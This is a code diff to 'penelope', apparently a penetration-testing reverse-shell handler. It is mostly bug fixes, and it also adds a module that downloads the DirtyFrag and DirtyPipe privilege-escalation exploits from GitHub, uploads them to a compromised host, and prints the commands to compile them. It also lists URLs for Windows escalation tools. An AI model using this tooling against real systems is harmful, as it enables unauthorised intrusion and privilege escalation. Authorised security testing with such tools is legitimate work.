@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.20.4"
+__version__ = "0.20.5"
 
 import os
 import io
@@ -402,7 +402,14 @@ class PBar:
 		speed = "" if not hasattr(self, 'speed') else f" | {self.metric(self.speed)}/s"
 		eta = "" if not hasattr(self, 'eta') else f" | ETA {timedelta(seconds=self.eta)}"
 		right = f"] {str(self.percent).rjust(3)}% ({self.metric(self.pos)}/{self.metric(self.end)}){speed}{elapsed}{eta}"
-		bar_space = self.barlen or os.get_terminal_size().columns - len(left) - len(right)
+		if self.barlen:
+			bar_space = self.barlen
+		else:
+			try:
+				columns = os.get_terminal_size().columns
+			except OSError:
+				columns = 80
+			bar_space = columns - len(left) - len(right)
 		bars = int(self.percent * bar_space / 100) * self.bar
 		print(f'\x1b[2K{left}{bars.ljust(bar_space, ".")}{right}\n', end='', flush=True)
 
@@ -535,17 +542,16 @@ def stdout(data, record=True):
 		core.output_line_buffer << data
 
 def ask(text):
-	try:
-		try:
-			return input(f"{paint(f'[?] {text}').yellow}")
-
-		except EOFError:
-			print()
-			return ask(text)
-
-	except KeyboardInterrupt:
-		print("^C")
-		return ' '
+        while True:
+                try:
+                        return input(f"{paint(f'[?] {text}').yellow}")
+                except EOFError:
+                        print()
+                        if not sys.stdin.isatty():
+                                return ''
+                except KeyboardInterrupt:
+                        print("^C")
+                        return ' '
 
 def my_input(text="", histfile=None, histlen=None, completer=lambda text, state: None, completer_delims=None):
 	if threading.current_thread().name == 'MainThread':
@@ -807,9 +813,9 @@ class MainMenu(BetterCMD):
 
 	@staticmethod
 	def get_core_id_completion(text, *extra, attr='sessions'):
-		options = list(map(str, getattr(core, attr)))
-		options.extend(extra)
-		return [option for option in options if option.startswith(text)]
+		choices = list(map(str, getattr(core, attr)))
+		choices.extend(extra)
+		return [choices for choices in choices if choices.startswith(text)]
 
 	def set_id(self, ID):
 		self.sid = ID
@@ -1019,6 +1025,8 @@ class MainMenu(BetterCMD):
 						self.onecmd("maintain")
 					for session in reversed(tuple(core.sessions.values())):
 						session.kill()
+				else:
+					return False
 		else:
 			core.sessions[ID].kill()
 
@@ -1051,42 +1059,46 @@ class MainMenu(BetterCMD):
 			cmdlogger.warning("Invalid syntax")
 			return False
 
+		group1, group2 = group1.strip(), group2.strip()
+		rhost = rport = lhost = lport = None
+
 		if arrow == '->':
 			_type = 'L'
 			lhost = "127.0.0.1"
 
-			if group2:
-				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group2)
-				if match:
-					rhost = match.group(1)
-					rport = match.group(2)
-					lport = rport
-				if not rport:
-					cmdlogger.warning("At least remote port is required")
-					return False
-			else:
+			if group2 and ':' in group2:
+				rhost, rport = group2.rsplit(':', 1)
+				lport = rport
+			if not rport:
 				cmdlogger.warning("At least remote port is required")
 				return False
 
 			if group1:
-				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group1)
-				if match:
-					lhost = match.group(1)
-					lport = match.group(2)
+				if ':' in group1:
+					lhost, lport = group1.rsplit(':', 1)
+					if not lhost:
+						lhost = "127.0.0.1"
 				else:
-					cmdlogger.warning("Invalid syntax")
-					return False
-
+					lport = group1
 		elif arrow == '<-':
 			_type = 'R'
 
-			if group2:
-				rhost, rport = group2.split(':')
+			if group2 and ':' in group2:
+				rhost, rport = group2.rsplit(':', 1)
 
-			if group1:
-				lhost, lport = group1.split(':')
+			if group1 and ':' in group1:
+				lhost, lport = group1.rsplit(':', 1)
 			else:
 				cmdlogger.warning("At least local port is required")
+				return False
+
+			if not (rhost and rport):
+				cmdlogger.warning("Remote endpoint (host:port) is required for reverse forwarding")
+				return False
+
+		for label, port in (("remote", rport), ("local", lport)):
+			if not (port and port.isdigit() and 0 < int(port) <= 65535):
+				cmdlogger.warning(f"Invalid {label} port: '{port}'. Valid numbers: 1-65535")
 				return False
 
 		core.sessions[self.sid].portfwd(_type=_type, lhost=lhost, lport=lport, rhost=rhost, rport=int(rport))
@@ -1290,7 +1302,7 @@ class MainMenu(BetterCMD):
 		if session.OS == 'Unix':
 			session.upgrade()
 		else:
-			session.upload(URLS['conptyshell'], remote_path=session.tmp)
+			uploaded = session.upload(URLS['conptyshell'], remote_path=session.tmp)
 			if not uploaded:
 				cmdlogger.error("Failed to upload ConPtyShell")
 				return
@@ -1902,34 +1914,34 @@ def handle_bind_errors(func):
 	return wrapper
 
 def Connect(host, port):
-
 	try:
 		port = int(port)
-		_socket = socket.socket()
-		_socket.settimeout(5)
-		_socket.connect((host, port))
-		_socket.settimeout(None)
-
-	except ConnectionRefusedError:
-		logger.error(f"Connection refused... ({host}:{port})")
-
-	except OSError:
-		logger.error(f"Cannot reach {host}")
-
-	except OverflowError:
-		logger.error("Invalid port number. Valid numbers: 1-65535")
-
 	except ValueError:
 		logger.error("Port number must be numeric")
-
+		return False
+	_socket = socket.socket()
+	_socket.settimeout(5)
+	handed_off = False
+	try:
+		_socket.connect((host, port))
+		_socket.settimeout(None)
+	except ConnectionRefusedError:
+		logger.error(f"Connection refused... ({host}:{port})")
+	except OSError:
+		logger.error(f"Cannot reach {host}")
+	except OverflowError:
+		logger.error("Invalid port number. Valid numbers: 1-65535")
 	else:
 		if not core.started:
 			core.start()
 		logger.info(f"Connected to {paint(host).blue}:{paint(port).orange} {EMOJIS['target']}")
 		session = Session(_socket, host, port)
 		if session:
+			handed_off = True
 			return True
-
+	finally:
+		if not handed_off:
+			_socket.close()
 	return False
 
 class TCPListener:
@@ -2102,6 +2114,7 @@ class Session:
 				self.ip = _socket.getpeername()[0]
 			except:
 				logger.error(f"Invalid connection from {self.target} {EMOJIS['invalid_shell']}")
+				self.socket.close()
 				return
 			self._host, self._port = self.socket.getsockname()
 			self.listener = listener
@@ -2368,7 +2381,7 @@ class Session:
 			response = self.exec("echo $$", agent_typing=True, value=True)
 
 		elif self.OS == 'Windows':
-			return None # TODO
+			return None
 
 		if not (isinstance(response, str) and response.isnumeric()):
 			logger.error(f"Cannot get the PID of the shell. Response:\r\n{paint(response).white}")
@@ -4164,7 +4177,6 @@ class Session:
 					).blue)
 				return session.spawn()
 			return True
-		return False
 
 	def kill(self):
 		if self not in core.rlist:
@@ -4815,10 +4827,17 @@ class upload_ad_scripts(Module):
 
 	def upload_ghostpack(session):
 		_, archive = url_to_bytes(URLS['ghostpack'])
+		if not archive:
+			logger.error("Failed to download GhostPack")
+			return
 		with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
 			with zipfile.ZipFile(io.BytesIO(archive)) as z:
 				z.extractall(tmpdir)
-				extracted_folder = list(Path(tmpdir).iterdir())[0]
+				extracted = list(Path(tmpdir).iterdir())
+				if not extracted:
+					logger.error("GhostPack archive was empty")
+					return
+				extracted_folder = extracted[0]
 				renamed_folder = extracted_folder.parent / "ghostpack"
 				os.rename(extracted_folder, renamed_folder)
 				session.upload(str(renamed_folder))
@@ -5046,54 +5065,67 @@ class panix(Module):
 			logger.error("This module runs only on Unix shells")
 
 
-class dirtyfrag(Module):
+class upload_local_exploits(Module):
 	category = "Privilege Escalation"
-	def run(session, args):
-		"""
-		Upload DirtyFrag exploit as 'dirtyfrag' folder
-		CVE-2026-43284: xfrm-ESP Page-Cache Write
-		CVE-2026-43500: RxRPC Page-Cache Write
-		Universal Linux LPE - no race condition required
-		Source: https://github.com/v4bel/dirtyfrag
-		"""
-		if session.OS != 'Unix':
-			logger.error("This module runs only on Unix shells")
+
+	def dirtyfrag(session):
+		if session.system != "Linux":
+			logger.error("This module runs only on Linux shells")
 			return
-		if not session.write_access(session.cwd):
+
+		uploaded = session.upload(URLS['dirtyfrag'])
+		if not uploaded:
+			logger.info("Failed to upload DirtyFrag")
 			return
-		_, archive = url_to_bytes(URLS['dirtyfrag_zip'])
-		with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
-			with zipfile.ZipFile(io.BytesIO(archive)) as z:
-				z.extractall(tmpdir)
-				extracted_folder = list(Path(tmpdir).iterdir())[0]
-				renamed_folder = extracted_folder.parent / "dirtyfrag"
-				os.rename(extracted_folder, renamed_folder)
-				session.upload(str(renamed_folder))
 		logger.info("DirtyFrag uploaded. Compile on target: cd dirtyfrag && gcc exp.c -o exp")
 
+	def dirtypipe(session):
+		if session.system != "Linux":
+			logger.error("This module runs only on Linux shells")
+			return
 
-class dirtypipe(Module):
-	category = "Privilege Escalation"
-	def run(session, args):
-		"""
-		Upload DirtyPipe (CVE-2022-0847) exploits as 'dirtypipe' folder
-		Source: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
-		"""
-		if session.OS != 'Unix':
-			logger.error("This module runs only on Unix shells")
-			return
-		if not session.write_access(session.cwd):
-			return
 		_, archive = url_to_bytes(URLS['dirtypipe_zip'])
+		if not archive:
+			logger.error("Failed to download DirtyPipe")
+			return
 		with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
 			with zipfile.ZipFile(io.BytesIO(archive)) as z:
 				z.extractall(tmpdir)
-				extracted_folder = list(Path(tmpdir).iterdir())[0]
+				extracted = list(Path(tmpdir).iterdir())
+				if not extracted:
+					logger.error("DirtyPipe archive was empty")
+					return
+				extracted_folder = extracted[0]
 				renamed_folder = extracted_folder.parent / "dirtypipe"
 				os.rename(extracted_folder, renamed_folder)
 				session.upload(str(renamed_folder))
 		logger.info("DirtyPipe uploaded. Compile on target: cd dirtypipe && gcc exploit-1.c -o exploit-1  ||  gcc exploit-2.c -o exploit-2")
 
+	def run(session, args):
+		"""
+		Upload local exploits {DirtyFrag, DirtyPipe}
+		"""
+		if not session.write_access(session.cwd):
+			return
+
+		requested = [t.lower() for t in args.split()] if args else []
+
+		tools = {
+			"dirtypipe": __class__.dirtypipe,
+			"dirtyfrag": __class__.dirtyfrag
+		}
+
+		if not requested:
+			logger.warning(f"Please choose an exploit: {list(tools.keys())}")
+
+		for tool in requested:
+			if tool not in tools:
+				logger.error(f"Unknown tool: {tool}")
+				continue
+			try:
+				tools[tool](session)
+			except Exception as e:
+				logger.error(f"Failed to upload {tool}: {e}")
 
 class meterpreter(Module):
 	def run(session, args):
@@ -5223,11 +5255,12 @@ class FileServer:
 
 	def remove(self, item):
 		item = os.path.abspath(normalize_path(item))
-		if item in self.filemap:
-			del self.filemap[f"/{os.path.basename(item)}"]
-		else:
-			if not self.quiet:
-				logger.warning(f"{item} is not served.")
+		for urlpath, filepath in self.filemap.items():
+			if filepath == item:
+				del self.filemap[urlpath]
+				return
+		if not self.quiet:
+			logger.warning(f"{item} is not served.")
 
 	@property
 	def links(self):
@@ -5353,10 +5386,11 @@ class FileServer:
 			self.httpd.serve_forever()
 
 	def stop(self):
-		del core.fileservers[self.id]
-		if not self.quiet:
-			logger.warning(f"Shutting down Fileserver #{self.id}")
-		self.httpd.shutdown()
+		if hasattr(self, 'id'):
+			del core.fileservers[self.id]
+			if not self.quiet:
+				logger.warning(f"Shutting down Fileserver #{self.id}")
+			self.httpd.shutdown()
 		self.term.set()
 
 
@@ -5555,7 +5589,7 @@ def listener_menu():
 		return False
 
 	listener_menu.active = True
-	func = lambda: _
+	func = lambda: None
 	listener_menu.control_r, listener_menu.control_w = os.pipe()
 
 	listener_menu.finishing = threading.Event()
@@ -5961,7 +5995,7 @@ URLS = {
 	'sigmapotato':		"https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe",
 	'printspoofer64':	"https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe",
 	'printspoofer32':	"https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe",
-	'dirtyfrag_zip':	"https://github.com/v4bel/dirtyfrag/archive/refs/heads/master.zip",
+	'dirtyfrag':		"https://raw.githubusercontent.com/V4bel/dirtyfrag/refs/heads/master/exp.c",
 	'dirtypipe_zip':	"https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/archive/refs/heads/main.zip",
 }
 
